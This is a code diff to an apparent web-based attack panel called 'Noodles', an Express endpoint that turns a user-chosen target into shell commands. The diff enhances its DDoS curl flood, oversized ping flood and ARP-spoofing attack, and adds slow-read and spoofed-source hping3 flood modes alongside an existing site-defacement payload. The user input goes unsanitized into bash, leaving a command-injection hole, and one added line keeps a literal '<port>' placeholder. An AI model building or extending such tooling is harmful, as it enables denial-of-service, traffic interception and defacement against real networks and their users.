@@ -8,6 +8,7 @@ const publicIp = require('public-ip');
 const rateLimit = require('express-rate-limit');
 const crypto = require('crypto');
 const promClient = require('prom-client');
+const { networkInterfaces } = require('os');
 
 app.use(express.static('public'));
 app.use(express.urlencoded({ extended: true }));
@@ -50,6 +51,18 @@ const apiLimiter = rateLimit({
 
 app.use('/attack', apiLimiter);
 
+function getNetworkInterface() {
+    const interfaces = networkInterfaces();
+    for (const name of Object.keys(interfaces)) {
+        for (const iface of interfaces[name]) {
+            if (!iface.internal && iface.family === 'IPv4') {
+                return name;
+            }
+        }
+    }
+    return null;
+}
+
 app.post('/attack', async (req, res) => {
     const target = req.body.target;
     const attackType = req.body.attackType;
@@ -71,10 +84,11 @@ app.post('/attack', async (req, res) => {
     let command = '';
     const numThreads = os.cpus().length * 8;
     const encodedTarget = target;
+    const networkInterface = getNetworkInterface();
 
     switch (attackType) {
         case 'ddos':
-            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do curl -A 'Noodles-DDoS' -s -o /dev/null ${encodedTarget} & done; done"`;
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do curl -A 'Noodles-DDoS' --http1.1 -s -o /dev/null ${encodedTarget} & done; done"`;
             break;
         case 'deface':
             const defaceScript = `<h1>Hacked by Noodles!</h1><img src="https://i.imgur.com/xxxxx.gif" style="width: 100%; height: auto;">`;
@@ -109,7 +123,7 @@ app.post('/attack', async (req, res) => {
             break;
 
         case 'ping_flood':
-            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do ping -f ${encodedTarget} & done; done"`;
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do ping -f -s 65500 ${encodedTarget} & done; done"`;
             break;
 
         case 'nuke':
@@ -153,11 +167,23 @@ app.post('/attack', async (req, res) => {
              break;
 
         case 'arp_cache_poisoning':
+             if (!networkInterface) {
+                log('Error: No suitable network interface found for ARP poisoning.');
+                return res.status(500).send('No suitable network interface found.');
+            }
              const gatewayIp = '192.168.1.1';
              const victimIp = target;
              const attackerMac = '00:11:22:33:44:55';
-             command = `timeout ${duration} bash -c "while true; do arpspoof -i eth0 -t ${victimIp} ${gatewayIp} & arpspoof -i eth0 -t ${gatewayIp} ${victimIp} & done"`;
+             command = `timeout ${duration} bash -c "while true; do arpspoof -i ${networkInterface} -t ${victimIp} ${gatewayIp} & arpspoof -i ${networkInterface} -t ${gatewayIp} ${victimIp} & done"`;
              break;
+
+         case 'slow_read':
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do python3 slow_read.py ${encodedTarget} & done; done"`;
+            break;
+
+        case 'pod_flood':
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 --icmp --icmp-ts --flood --rand-source -p <port> ${encodedTarget} & done; done"`;
+            break;
 
         default:
             log(`Error: Invalid attack type: ${attackType}`);
